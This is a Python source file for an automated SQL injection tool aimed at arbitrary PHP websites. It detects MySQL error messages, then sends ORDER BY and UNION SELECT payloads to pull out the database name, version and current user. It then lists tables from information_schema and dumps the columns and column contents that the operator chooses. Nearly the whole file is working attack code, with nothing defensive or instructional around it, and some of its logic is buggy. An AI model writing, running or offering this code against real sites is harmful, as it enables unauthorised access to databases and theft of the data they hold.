import requests
import bs4
from bs4 import BeautifulSoup
import argparse
import urllib3
import sys
urllib3.disable_warnings()
def exploit(target, dirs):
	if 'http://' in target:
		target = target[7:]
		crawl = "http://"
	elif 'https://' in target:
		target = target[8:]
		crawl = "https://"
	print("[*] Checking with Basic Payload Query . . .")
	if '=' not in dirs:
		print("[-] Query cannot be used . ..")
		sys.exit(1)
	vuln = []
	warning = 0
	wrn_msg = []
	vulns = 0
	requ = crawl + target + "/" +dirs + "'"
	mek = requests.get(requ, verify=False)
	if mek.status_code == 200:
		if '<b>Warning</b>:' in mek.text:
			wrn_msg.append("Warning")
			print("[*] Message message found!")
			warning += 1
		if 'Warning: mysql_fetch_array()' in mek.text:
			print("[*] Warning message got!")
			wrn_msg.append("Warning: mysql_fetch_array")
			warning += 1
		#elif '<b>Warning</b>:  mysql_num_rows() expects parameter 1' in mek.text:
		#	print("[*] Warning message got!")
			#wrn_msg.append("<b>Warning</b>:  mysql_num_rows() expects parameter 1")
			#warning += 1
	if warning > 0:
		print("[*] Checking what is so warning . . .")
		bs = BeautifulSoup(mek.content, 'html.parser')
		bss = bs.find_all("div")
		for contents in bss:
			contents = contents.get_text()
			contents = str(contents)
			if 'boolean given' in contents:
				vuln.append("Boolean Based!")
				vulns += 1
		bss = bs.find_all("p")
		for contents in bss:
			contents = contents.get_text()
			contents = str(contents)
			if 'bool given' in contents:
				vuln.append("Boolean Based!")
				vulns += 1
	for pikaso in vuln:
		pikaso = pikaso
	for warns in wrn_msg:
		warns = warns
	if vulns > 0:
		ko = True
	else:
		ko =  False 
	if ko != True:
		pror = "No"
	else:
		pror = "Yes"
	print(f'''
Site: {target}
Vulnerable: {pror}
Warning message: {warns}
Vulnerability: {pikaso}''')
	if pror == 'Yes':
		option = input("[*] Do you want to exploit it (Y/N): ")
		if option == 'y':
			good = 0
			print("[*] Preparing to exploit . . . %s " % target)
			print("\x0A")
			print("[*] Trying with order by  . . . .")
			numberie = 0
			for sigma in range(10):
				_payload_ = f"1 order by {str(sigma)}"
				_pd_ = crawl + target + "/" + dirs + _payload_
				ros = requests.get(_pd_, verify=False)
				if warns in ros.text:
					print(f"[-] Not vulnerable - {_payload_}")
				else:
					#print(ros.text)
					print(f"[*] Vulnerable!  - {_payload_}")
					numberie += 1
					good += 1
			true = 0
			if good > 0:
				print("[*] Preparing .. Union based attacks . .")
				print(numberie)
				if numberie == 3:
					payload = f"1 union select 1,2,3"
					csr = crawl + target + "/" + dirs + payload 
					req = requests.get(csr, verify=False)
					if warns in req.text:
						print("[-] Union failure .. ")
					else:
						print("[*] Union exploit completed!")
						true += 1
				elif numberie == 4:
					payload = f"1 union select 1,2,3,4"
					csr = crawl + target + "/" + dirs + payload 
					req = requests.get(csr, verify=False)
					if warns in req.text:
						print("[-] Union failure .. ")
					else:
						print("[*] Union exploit completed!")
						true += 1
				elif numberie == 10:
					payload = f"1 union select 1,2,3,4,5,6,7"
					csr = crawl + target + "/" + dirs + payload 
					req = requests.get(csr, verify=False)
					if warns in req.text:
						print("[-] Union failure .. ")
					else:
						print("[*] Union exploit completed!")
						true += 1
			failed = 0
			if true > 0:
				print('[*] Preparing to get database .. . ')
				database = "-1 union select 1,database(),3"
				payload = crawl + target + "/" +dirs + database
				roc = requests.get(payload, verify=False)
				if warns in roc.text:
					print("[-] Exploit has failed . .. ")
					failed += 1
					return False
				true_2 = 0
				poc = BeautifulSoup(roc.content, 'html.parser')
				poced = poc.find_all("h2")
				for contents in poced:
					ros = contents.get_text()
					ros = str(ros)
					if ros == None:
						print("[-] No database enumerated . ..")
					print("[*] Database name: %s" % ros)
					failed -= 1
					true_2 += 1
			if failed > 0:
				print("[-] Cannot SQL Injection . . .")
				sys.exit(1)
			if true_2 > 0:
				print("[*] Preparing to get current version . . . ")
				rockstar = "-1 union select 1,version(),current_user()"
				_payload_ = crawl + target + "/" + dirs + rockstar
				rockie = requests.get(_payload_, verify=False)
				if warns in rockie.text:
					print("[-] Couldn't get version . .. ")
				p_ = BeautifulSoup(rockie.content, 'html.parser')
				_p = p_.find_all("h2")
				for contents in _p:
					ros_ = contents.get_text()
					ros = str(ros_)
					print("[*] Database name: %s" % ros)
			if true_2 < 0:
				return False
			if true_2 > 0:
				tables = []
				print("[*] Preparing to get all tables . . . ")
				for omighty in range(9):
					rocks_ = f"-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit {omighty},1"
					posix = crawl + target + "/" + dirs + rocks_
					po = requests.get(posix, verify=False)
					if warns in po.text:
						print("[-] Not vulnerable . .")
					bs = BeautifulSoup(po.content, 'html.parser')
					bss = bs.find_all("h2")
					for contents in bss:
						contents = contents.get_text()
						tables.append(contents)

			for tabling in tables:
				print(f"[*] Table ==> {tabling}")
			def exploitation():
				xz = input("[*] Enter tables name: ")
				#if xz not in tabling:
					#print("[-] Incorrect choice . . %s " % xz)
					#exploitation()
				print("[*] Preparing to enumerate it . . .%s"  % xz)
				pu = f"-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='{xz}'"
				crawled = crawl + target + "/" + dirs + pu 
				ro = requests.get(crawled, verify=False)
				if warns in ro:
					print("[-] Exploit Failure . .. ")
					sys.exit(1)
				op = BeautifulSoup(ro.content, 'html.parser')
				po = op.find_all("h2")
				enum = []
				for alls in po:
					alls = str(alls.get_text())
					enum.append(alls)
				for cres in enum:
					print(f"[*] Exploited! ==> {cres}")
				zx = input("[*] Enter (b) to get to first or (c) to continue: ")
				if zx == 'b':
					exploitation()
				if zx == 'c':
					v = input('[*] Enter table: ')
					print("[*] Enumerating %s" % v)
					_o = f"-1 union select 1,group_concat({v}),3 from {xz}"
					_l = crawl + target + "/" + dirs + _o
					l = requests.get(_l, verify=False)
					bs = BeautifulSoup(l.content, 'html.parser')
					bss = bs.find_all("h2")
					for wtf in bss:
						wtf = wtf.get_text()
						print(f"[*] Tables Enumerated ===> {str(wtf)}")
					input("Press enter to get back")
					exploitation()
			exploitation()
def __main__():
	parssie = argparse.ArgumentParser()
	parssie.add_argument("-t", "--uri", help="Specify a website", required=True)
	parssie.add_argument("-d", "--dir", help="Specify a PHP dir", required=True)
	args = parssie.parse_args()
	target = args.uri
	dirs = args.dir
	exploit(target, dirs)
__main__()